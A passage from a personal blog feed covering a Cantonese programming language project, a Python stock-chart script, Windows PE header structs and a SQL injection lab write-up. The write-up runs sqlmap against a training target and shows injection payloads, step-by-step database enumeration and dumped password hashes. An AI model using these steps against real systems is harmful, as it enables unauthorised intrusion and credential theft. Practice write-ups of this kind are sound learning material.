听日下午仲要翻学校测试最 poor guy 个3科(物理, 化学, 生物)啊!!!</p>]]></content>
      
      
      
        <tags>
            
            <tag> compiler </tag>
            
            <tag> cantonese </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cantonese gets 700 stars on github! 粤语编程語言集齐700个stars喇!</title>
      <link href="/2021/06/29/cantonese/cantonese_pl/"/>
      <url>/2021/06/29/cantonese/cantonese_pl/</url>
      
        <content type="html"><![CDATA[<p>今天系一个圣神的日子, 我嘅粤语编程语言终于有700个stars喇!<br>在网上亦睇到好多自媒体嘅报道:<br><a href="https://zhuanlan.zhihu.com/p/379533149">https://zhuanlan.zhihu.com/p/379533149</a><br><a href="https://www.163.com/dy/article/GC4URR0R0511AQHO.html">https://www.163.com/dy/article/GC4URR0R0511AQHO.html</a><br><a href="https://www.jiqizhixin.com/articles/2021-06-10-3">https://www.jiqizhixin.com/articles/2021-06-10-3</a><br>…<br>虽然标题仲系写16岁高中生(其实我过5月份后已经17岁喇), 不过感受当然系开心啦!<br>在 github 上都 feel 到好多朋友对粤语编程语言感兴趣, 当然都有一小部分喷子…  </p><p>下个目标: 冲上 1000+ stars!!!</p><p>噉最后就轮到我推广一波:<br>17岁高中生开发粤语编程语言! Github stars 700+.<br>项目地址: <a href="https://github.com/StepfenShawn/Cantonese">https://github.com/StepfenShawn/Cantonese</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> compiler </tag>
            
            <tag> cantonese </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>What 7 your code? It&#39;s Cantonese programming language! 整古做怪 -- 开发粤语編程語言</title>
      <link href="/2020/12/20/cantonese/first_cantonese_pl/"/>
      <url>/2020/12/20/cantonese/first_cantonese_pl/</url>
      
        <content type="html"><![CDATA[<p>最近在 <code>github</code> 上睇到东北编程语言, 四川编程语言, 甚至夸张到仲有文言文添…<br>作为一条广州嘅肠粉, 自然地产生了一个 idea: 粤语编程语言  </p><p>虽然我嘅语文(即系中文科)经常fail(不合格), 但都有信心开发呢个编程语言嘅!<br>咩话? 开发编程语言? 技术过关咩?<br>唔使担心, 畀D信心自己, 我之前已经学识点样写一个简单嘅解释器喇…</p><p>兴奋到已经构想出来 <code>Hello World</code> 应该点写:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">畀我睇下 <span class="string">&quot;Hello World&quot;</span> 点样先</span><br></pre></td></tr></table></figure><p>上网 Search 咗有D人话”系”嘅粤语正字应该是”係”, 又有人争议呢个是香港写法, 为了避免争议我希望粤语编程语言都支持简体与繁体! 我希望嚟紧嘅寒假能完成这个编程语言!!!</p><p>唔讲咁多先, 补翻D作业先, 晚上仲要翻学校测数学(内地的苦逼高中生)…<br>虽然好撚有challenge, 不过想下都觉得兴奋!</p>]]></content>
      
      
      
        <tags>
            
            <tag> compiler </tag>
            
            <tag> cantonese </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dont be a SQL boy. Let&#39;s be a hacker. 记录一次 sql 注入</title>
      <link href="/2020/07/22/sql_inject_mark/"/>
      <url>/2020/07/22/sql_inject_mark/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>靶机:<a href="http://219.153.49.228:42101/">http://219.153.49.228:42101/</a></p><p>第一步: 判断是否为注入点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2</span><br></pre></td></tr></table></figure><p>结果出来了，果然有漏洞:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: <span class="built_in">id</span>=1 AND 1729=1729</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1 AND (SELECT 4966 FROM (SELECT(SLEEP(5)))Skub)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: <span class="built_in">id</span>=-4567 UNION ALL SELECT NULL,NULL,CONCAT(0x7171767071,0x6e4d6358704a4767585255695747714242575366494e7a6563626f6b4572684650674676766d554f,0x716b787671),NULL-- -</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后，获取数据库:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --dbs</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mozhe_Discuz_StormGroup</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure><p>接下来就是拖库操作了<br>第三步，查看当前程序所用的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --current-db</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[22:29:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[22:29:54] [INFO] fetching current database</span><br><span class="line">current database: <span class="string">&#x27;mozhe_Discuz_StormGroup&#x27;</span></span><br></pre></td></tr></table></figure><p>再看一下当前用户:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --current-user</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[22:36:41] [INFO] fetching current user</span><br><span class="line">current user: <span class="string">&#x27;root@localhost&#x27;</span></span><br></pre></td></tr></table></figure><p>第四步, 列出指定数据库的所有表，<code>-D</code>来指定数据表:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --tables -D <span class="string">&quot;mozhe_Discuz_StormGroup&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_Discuz_StormGroup</span><br><span class="line">[2 tables]</span><br><span class="line">+-------------------+</span><br><span class="line">| StormGroup_member |</span><br><span class="line">| notice            |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p>第五步，读取表中的字段名称:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 --tables -D mozhe_Discuz_StormGroup -T StormGroup_member --columns</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_Discuz_StormGroup</span><br><span class="line">Table: StormGroup_member</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| <span class="built_in">id</span>       | int(11)      |</span><br><span class="line">| name     | varchar(20)  |</span><br><span class="line">| password | varchar(255) |</span><br><span class="line">| status   | int(11)      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure><p>可以看到password就是我们想要的东西，最后来查询它:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://219.153.49.228:42101/&quot;</span> --forms --crawl=2 -D mozhe_Discuz_StormGroup --tables -C password --dump</span><br></pre></td></tr></table></figure><p>flag就被拿到了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_Discuz_StormGroup</span><br><span class="line">Table: StormGroup_member</span><br><span class="line">[2 entries]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| password                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 356f589a7df439f6f744ff19bb8092c0 |</span><br><span class="line">| b39fe7ddfdd7f0a66af7c1da837f210b |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Get stocks data with python. 用python获得股票数据</title>
      <link href="/2020/04/03/draw_stock_map/"/>
      <url>/2020/04/03/draw_stock_map/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入第三方库</span></span><br><span class="line"><span class="keyword">import</span> pandas_datareader</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取现在的时间</span></span><br><span class="line"><span class="comment"># (2020, 3, 7, 10, 37, 13, 186885)</span></span><br><span class="line">end = datetime.datetime.now()</span><br><span class="line">start = datetime.datetime(end.year - <span class="number">1</span>,</span><br><span class="line">                          end.month,</span><br><span class="line">                          end.day)</span><br><span class="line"><span class="comment"># 获取阿里巴巴数据</span></span><br><span class="line">alibaba = pandas_datareader.data.DataReader(<span class="string">&#x27;BABA&#x27;</span>, <span class="string">&#x27;yahoo&#x27;</span>, start, end)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印数据</span></span><br><span class="line"><span class="built_in">print</span>(alibaba)</span><br><span class="line"></span><br><span class="line">alibaba[<span class="string">&#x27;Adj Close&#x27;</span>].plot(legend = <span class="literal">True</span>,</span><br><span class="line">                          figsize = (<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line">alibaba[<span class="string">&#x27;Open&#x27;</span>].plot(legend = <span class="literal">True</span>,</span><br><span class="line">                          figsize = (<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line">alibaba[<span class="string">&#x27;High&#x27;</span>].plot(legend = <span class="literal">True</span>,</span><br><span class="line">                          figsize = (<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line"><span class="comment"># 把图片show出来</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">                  High         Low  ...    Volume   Adj Close</span><br><span class="line">Date                                ...                      </span><br><span class="line">2019-03-06  185.589996  183.020004  ...  10009100  184.169998</span><br><span class="line">2019-03-07  181.800003  176.729996  ...  16488900  177.320007</span><br><span class="line">2019-03-08  175.350006  171.565002  ...  14674200  175.029999</span><br><span class="line">2019-03-11  181.720001  177.580002  ...  13764000  180.410004</span><br><span class="line">2019-03-12  182.179993  179.509995  ...   8660000  180.630005</span><br><span class="line">2019-03-13  182.535004  179.259995  ...   8868200  180.699997</span><br><span class="line">2019-03-14  180.820007  178.009995  ...   9272000  180.360001</span><br><span class="line">2019-03-15  181.449997  179.660004  ...  10844100  180.970001</span><br><span class="line">2019-03-18  182.889999  180.759995  ...   7847800  181.830002</span><br><span class="line">2019-03-19  183.360001  180.850006  ...  10238600  182.139999</span><br><span class="line">2019-03-20  181.949997  178.429993  ...  15901500  181.279999</span><br><span class="line">2019-03-21  181.729996  178.520004  ...   9754500  181.500000</span><br><span class="line">2019-03-22  180.479996  175.335999  ...  11688400  176.259995</span><br><span class="line">2019-03-25  178.899994  174.100006  ...   7511400  178.770004</span><br><span class="line">2019-03-26  180.649994  177.095001  ...   7897900  178.080002</span><br><span class="line">2019-03-27  179.830002  176.912994  ...   8371000  177.029999</span><br><span class="line">2019-03-28  178.529999  175.970001  ...   7233000  177.729996</span><br><span class="line">2019-03-29  182.600006  179.000000  ...  13850900  182.449997</span><br><span class="line">2019-04-01  185.559998  180.889999  ...  12714800  180.889999</span><br><span class="line">2019-04-02  183.563004  180.949997  ...   8021500  181.740005</span><br><span class="line">2019-04-03  180.699997  176.759995  ...  26819000  178.320007</span><br><span class="line">2019-04-04  181.960007  176.889999  ...  16993200  181.070007</span><br><span class="line">2019-04-05  185.500000  182.000000  ...  18705000  185.350006</span><br><span class="line">2019-04-08  187.820007  184.009995  ...  14725600  186.500000</span><br><span class="line">2019-04-09  187.889999  186.160004  ...  11578200  187.190002</span><br><span class="line">2019-04-10  187.399994  184.000000  ...  10655000  186.190002</span><br><span class="line">2019-04-11  186.059998  183.750000  ...   8900300  184.979996</span><br><span class="line">2019-04-12  189.789993  187.139999  ...  12600000  188.910004</span><br><span class="line">2019-04-15  188.169998  182.559998  ...  14616600  183.070007</span><br><span class="line">2019-04-16  185.789993  183.399994  ...  12195900  185.779999</span><br><span class="line">...                ...         ...  ...       ...         ...</span><br><span class="line">2020-01-24  219.830002  211.324997  ...  18143900  213.750000</span><br><span class="line">2020-01-27  208.020004  199.500000  ...  24574700  205.470001</span><br><span class="line">2020-01-28  210.910004  207.169998  ...  16196700  210.229996</span><br><span class="line">2020-01-29  213.979996  209.520004  ...  12871900  212.020004</span><br><span class="line">2020-01-30  209.860001  205.029999  ...  14376000  208.580002</span><br><span class="line">2020-01-31  207.929993  204.727997  ...  18181400  206.589996</span><br><span class="line">2020-02-03  215.020004  208.669998  ...  14131900  213.100006</span><br><span class="line">2020-02-04  224.380005  220.490005  ...  16695100  222.880005</span><br><span class="line">2020-02-05  226.699997  217.539993  ...  15766100  220.220001</span><br><span class="line">2020-02-06  223.649994  219.779999  ...  10790800  220.899994</span><br><span class="line">2020-02-07  217.839996  214.880005  ...  13790300  216.529999</span><br><span class="line">2020-02-10  215.770004  212.199997  ...  17420300  215.770004</span><br><span class="line">2020-02-11  220.009995  215.289993  ...  16073500  217.210007</span><br><span class="line">2020-02-12  225.520004  220.210007  ...  18671900  224.309998</span><br><span class="line">2020-02-13  225.000000  218.990005  ...  28069700  220.360001</span><br><span class="line">2020-02-14  221.639999  218.229996  ...  10690000  219.630005</span><br><span class="line">2020-02-18  220.850006  217.509995  ...  12987000  220.520004</span><br><span class="line">2020-02-19  223.559998  220.750000  ...  10798100  222.139999</span><br><span class="line">2020-02-20  222.500000  214.220001  ...  14950100  218.039993</span><br><span class="line">2020-02-21  217.600006  211.559998  ...  17681200  212.589996</span><br><span class="line">2020-02-24  207.279999  202.509995  ...  19380200  206.160004</span><br><span class="line">2020-02-25  209.949997  204.100006  ...  18132400  205.610001</span><br><span class="line">2020-02-26  213.080002  206.789993  ...  19482100  208.740005</span><br><span class="line">2020-02-27  209.970001  201.860001  ...  22741200  205.029999</span><br><span class="line">2020-02-28  208.919998  198.561005  ...  31276200  208.000000</span><br><span class="line">2020-03-02  211.110001  203.755997  ...  21542200  210.979996</span><br><span class="line">2020-03-03  211.389999  202.240005  ...  20813800  207.410004</span><br><span class="line">2020-03-04  212.699997  208.850006  ...  12474400  211.960007</span><br><span class="line">2020-03-05  215.149994  209.139999  ...  13462900  211.460007</span><br><span class="line">2020-03-06  207.000000  201.100006  ...  21679700  204.639999</span><br><span class="line"></span><br><span class="line">[254 rows x 6 columns]</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows PE structure. PE 相关结构体定义</title>
      <link href="/2020/03/29/system/pe_file/"/>
      <url>/2020/03/29/system/pe_file/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DOS头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PE头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PE文件头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</span></span><br><span class="line"><span class="comment">//PE扩展头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    DWORD   ImageBase;            <span class="comment">//exe:0x40000h,  dll:0x10000000h</span></span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据目录表</span></span><br><span class="line"><span class="keyword">typedef</span> 